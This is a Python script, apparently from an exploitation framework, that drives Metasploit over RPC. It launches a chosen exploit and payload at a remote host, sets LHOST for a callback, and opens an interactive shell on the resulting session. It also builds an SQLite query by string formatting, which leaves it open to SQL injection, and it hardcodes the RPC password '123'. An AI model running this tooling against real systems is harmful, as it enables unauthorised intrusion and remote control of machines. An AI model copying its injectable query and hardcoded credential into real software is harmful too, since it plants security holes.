import sqlite3
import argparse
import re
from  pymetasploit3_updated.msfrpc import MsfRpcClient


session_found_re = r'(session \d+ created in the background)|(command shell session \d+ opened)'

def interact_with_session(session_id, msf_rpc_client):
    try:
        shell = msf_rpc_client.sessions.session(session_id)

        print('[*] Shell Started')
        print('-----------------')

        while True:
            try:
                cmd = input()                        
                shell.write(str(cmd) + '\n')
                read_value = shell.read()
                print(read_value)

            except KeyboardInterrupt:
                break
            
            except Exception as e:
                print(e)
    except Exception as e:
        print(e)
        pass


def main_():

    msfrpcd_password = '123'            
    
    msf_rpc_client = MsfRpcClient(msfrpcd_password, ssl=True)

    parser=argparse.ArgumentParser()        
    parser.add_argument("exploit", help="input the exploit", type=str)
    parser.add_argument("payload", help="input the payload", type=str)
    parser.add_argument("rhost", help="input the address of the vulnerable rhost", type=str)
    parser.add_argument("rport", help="input the rport", type=str)
    parser.add_argument("lhost", help="input the lhost", type=str)

    args = parser.parse_args()
    
    via_exploit = args.exploit
    via_payload = args.payload
    session_host = args.rhost
    session_port = int(args.rport)
    lhost = args.lhost


    conn = sqlite3.connect('./exploitation.db')
    cur = conn.cursor()
    cmd = 'SELECT * from sessions where rhost="{0}" AND rport="{1}" AND exploit="{2}" AND payload="{3}"'.format(session_host, session_port, via_exploit, via_payload)
    cur.execute(cmd)
    session_info = cur.fetchone()

    rhost = session_info[1]
    rport = session_info[2]
    exploit = session_info[4]
    payload = session_info[5]

    session_exists = False

    for k, v in msf_rpc_client.sessions.list.items():
        
        if v['session_host'] == rhost and \
        v['session_port'] == int(rport) and \
        v['via_exploit'] == ('exploit/' + exploit):

            session_exists = True

            session_id = k

            interact_with_session(session_id, msf_rpc_client)

    if not session_exists:
        print('[*] Starting Shell')
        print('-----------------')
        exploit = msf_rpc_client.modules.use('exploit', exploit)
                    
        exploit_required_arguments = exploit.missing_required
        
        for exploit_argument in exploit_required_arguments:

            if exploit_argument == 'RHOSTS':
                exploit['RHOSTS'] = rhost
            elif exploit_argument == 'SESSION':
                exploit['SESSION'] = True
            elif exploit_argument == 'RPORT':
                exploit['RPORT'] = rport
            elif exploit_argument == 'HNAME':
                exploit['HNAME'] = lhost

        payload = msf_rpc_client.modules.use('payload', payload)

        missing_payloads = payload.missing_required

        
        if missing_payloads == ['LHOST']:
            payload['LHOST'] = lhost

        elif missing_payloads == ['RPORT']:
            payload['RPORT'] = rport

        elif missing_payloads == ['RHOSTS']:
            payload['RHOSTS'] = rhost    

        elif missing_payloads == ['PATH']:
            payload['PATH'] = True

        elif missing_payloads == ['CMD']:
            payload['CMD'] = False

        elif missing_payloads == ['HNAME']:
            payload['HNAME'] = lhost
        

        console_id = msf_rpc_client.consoles.console().cid
        console = msf_rpc_client.consoles.console(console_id)
        exploit_status_full_output = console.run_module_with_output(exploit, payload=payload)
        print(exploit_status_full_output)
        exploit_status_output = exploit_status_full_output.split('\n')

        exploit_status_output = str(exploit_status_output[-2]).lower()

        exploit_status_session_match = re.search(session_found_re, exploit_status_output)

        if exploit_status_session_match:
            session_id = re.findall(r'\d+', exploit_status_output)
            session_id = session_id[0]

            interact_with_session(session_id, msf_rpc_client)



if __name__ ==  "__main__":
    main_()
    
